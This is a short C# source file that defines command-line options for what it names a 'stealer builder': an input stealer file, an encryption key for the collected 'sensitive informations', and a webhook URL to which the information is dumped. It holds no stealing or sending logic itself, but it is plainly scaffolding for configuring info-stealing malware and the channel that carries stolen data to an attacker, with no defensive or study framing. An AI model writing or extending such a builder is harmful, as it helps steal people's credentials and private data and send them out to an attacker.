using CommandLine;

namespace MyStealerBuilder
{
    public class CommandOptions
    {
        [Option('i', "input", HelpText = "The stealer file to process")]
        public string Verbose { get; set; }

        [Option('k', "key", Required = false, HelpText = "The unique encryption key to encrypt all sensitive informations")]
        public string EncryptionKey { get; set; }

        [Option('u', "url", Required = false, HelpText = "The webhook url to dump the information")]
        public string WebhookUrl { get; set; }
    }
}
